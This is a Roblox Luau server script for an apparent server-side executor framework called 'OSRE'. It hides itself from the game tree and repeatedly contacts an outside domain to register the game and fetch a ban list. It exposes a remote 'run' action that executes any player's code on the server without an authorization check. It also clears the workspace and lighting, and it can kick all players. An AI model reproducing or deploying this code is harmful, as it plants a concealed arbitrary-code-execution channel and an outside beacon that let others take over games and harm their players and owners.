--!nocheck
repeat task.wait()
	script.Parent = nil
until script.Parent == nil
script.Disabled = true

--locals
local version = "3.4.10"
local isbeta = false
local mapkey = "osremap"

local core = script.core
local map = core.map
local script_runner = core.script_runner

local types = require(core.types)
local remotehandler = require(core.remotehandler)
local services = require(core.services)
local settings = require(core.settings)

local shared = {}
local plrinfo = {}

local remotefunction: remotehandler.RemoteHandler
do -- shared stuff
	local Bans = {}
	local instcache = {}
	local function getreadable(instance)
		local props = {}
		local className = instance.ClassName
		if instcache[className] then return instcache[className] end
		local infos = services.ReflectionService:GetPropertiesOfClass(className)

		for i = 1, #infos do
			local name = infos[i].Name
			local ok, value = pcall(function()
				return instance[name]
			end)
			if ok then
				props[name] = value
			end
		end
		instcache[className] = props

		return props
	end
	
	shared.HttpEnabled = services.HttpService.HttpEnabled
	shared.LoadstringEnabled = pcall(loadstring,"x = 1")
	shared.StreamingEnabled = workspace.StreamingEnabled
	shared.IsStudio = services.RunService:IsStudio()

	shared.BanningEnabled = (function()
		local don, err = pcall(function()
			services.Players:BanAsync({
				UserIds = {1},
				ApplyToUniverse = true,
				Duration = -1,
				DisplayReason = "test",
				PrivateReason = "test",
				ExcludeAltAccounts = false,
			})
		end)
		if not don then
			if err and err:find("BanningEnabled") then
				return false
			end
		end
		return true
	end)()
	
	function shared:randomstr(length)
		local temp, letters = "", string.split("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm", "")
		for i = 1, length or 10 do
			temp..=string.char(math.random(string.byte("a"),string.byte("z")))
		end
		return temp
	end
	
	function shared:findplr(user: string | number)
		for _, plr in services.Players:GetPlayers() do
			if typeof(user) == "string" and plr.Name:lower():find(user:lower()) or typeof(user) == "number" and plr.UserId == user then
				return plr
			end
		end
		return
	end
	
	function shared:destroy(inst)
		pcall(game.Destroy, inst)
	end
	
	function shared:betterdestroy(inst)
		for instprop,_ in getreadable(inst) do
			task.defer(pcall, game.Destroy, inst)
			xpcall(function()
				prop = inst[instprop]
				if typeof(prop) == "boolean" then
					inst[instprop] = not inst[instprop]
				elseif typeof(prop) == "number" then
					inst[instprop] = math.random()
				elseif typeof(prop) == "string" then
					inst[instprop] = tostring(math.random())
				elseif typeof(prop) == "EnumItem" then
					inst[instprop] = Enum[instprop.EnumType]:GetEnumItems()[math.random(1, #Enum[instprop.EnumType]:GetEnumItems())]
				end
			end)
		end
	end
	
	function shared:clean(inst, betterdestroy)
		for _,v in inst:GetDescendants() do
			if betterdestroy then
				shared:betterdestroy(v)
			else
				shared:destroy(v)
			end
		end
	end
	
	function shared:respawnall()
		for _, plr in services.Players:GetPlayers() do
			pcall(plr.LoadCharacter, plr)
		end
	end

	function shared:shutdown(msg)
		services.Players.PlayerAdded:Connect(function(plr)
			plr:Kick(msg)
		end)
		for _, plr in services.Players:GetPlayers() do
			plr:Kick(msg)
		end
		task.wait(1)
		services.RunService.Heartbeat:Connect(function()
			shared:clean(services.Players)
		end)
	end

	function shared:serverinfo()
		return {
			memory = services.Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.LuaHeap),
			serverfps = 1/services.RunService.Heartbeat:Wait(),
			players = #services.Players:GetPlayers(),
			uptime = tostring(workspace.DistributedGameTime):sub(1, 4),
		}
	end

	function shared:output(plr, level, msg, time)
		if typeof(msg) ~= "string" then
			msg = tostring(msg or "")
		end
		
		if plr then
			remotefunction:InvokeClient(plr, "message", level, {
				title = "Server Message",
				body = msg,
				duration = time,
			})
		else
			for _,v in services.Players:GetPlayers() do
				remotefunction:InvokeClient(v, "message", level, {
					title = "Server Message",
					body = msg,
					duration = time,
				})
			end
		end
	end

	function shared.playerconnection(func)
		for _,v in services.Players:GetPlayers() do
			task.spawn(func, v)
		end
		return services.Players.PlayerAdded:Connect(func)
	end
	
	function shared.wrap(f, ...)
		return coroutine.wrap(f)(...)
	end
	
	function shared.getbans()
		return Bans
	end
		
	local function onmsgfire(type)
		return function (data, plr)
			if plr and plr:IsA("Player") then
				remotefunction:InvokeClient(plr, "message", type, data)
			else
				remotefunction:InvokeAllClients("message", type, data)
			end
		end
	end

	shared.Success = onmsgfire("Success")
	shared.Error = onmsgfire("Error")
	shared.Warn = onmsgfire("Warn")
	shared.Info = onmsgfire("Info")
		
	shared.settings = settings
	shared.onbanupdate = Instance.new("BindableEvent")
	shared.services = services
	shared.map = map
	shared.mapkey = mapkey

	if shared.HttpEnabled then
		shared.wrap(function()
			local function update()
				task.spawn(services.HttpService.GetAsync, services.HttpService, "https://req-exe.win/api/addgame")
				Bans = services.HttpService:JSONDecode(
					services.HttpService:GetAsync("https://req-exe.win/bans/banlist.json", true)
				)
				shared.onbanupdate:Fire()
			end
			
			while true do
				local done
				repeat
					done = pcall(update)
					task.wait(1)
				until done == true
				task.wait(15)
			end
			
		end)
	end
end

remotefunction = remotehandler.server.new({
	Name = "OSRE_REMOTE",
	RemoteType = "RemoteFunction",
	Parent = services.ReplicatedStorage,
	Func = function(plr, action, ...)
		if not plrinfo[plr] then
			local scr_runner = script_runner:Clone()
			local bindablefunc = scr_runner.runscr
			local actor = Instance.new("Actor", services.ServerScriptService)
			
			actor.Name, scr_runner.Name, bindablefunc.Name = shared:randomstr(), shared:randomstr(), shared:randomstr()
			
			scr_runner.Parent = actor
			scr_runner.Enabled = true
			
			plrinfo[plr] = {
				scriptrunner = bindablefunc
			}
		end
		if action == "scriptinfo" then
			return version, isbeta and "BETA" or "STABLE", settings.NFCS
		elseif action == "serverinfo" then
			return shared:serverinfo()
		elseif action == "respawn" then
			return plr:LoadCharacter()
		elseif action == "run" then
			task.spawn(function(...)
				if settings.logging.enabled then
					settings.logging.onlog(plr, ...)
				end
			end,...)
			
			return plrinfo[plr].scriptrunner:Invoke(..., plr)
		end
		print(plr, action, ...)
		
		return false
	end,
})
shared.remote = remotefunction

--init
services.StarterGui:ClearAllChildren()

for _,v in core.autorun:GetChildren() do
	pcall(function()require(v)(shared);end)
end

shared:clean(workspace)
shared:clean(services.StarterGui)
shared:clean(services.Lighting)

for _,v in map:GetDescendants() do
	v:AddTag(mapkey)
	if v:IsA("Script") then
		v.Enabled = true
	end
end;map:AddTag(mapkey)
map:Clone().Parent = workspace
shared:respawnall()]]></ProtectedString>
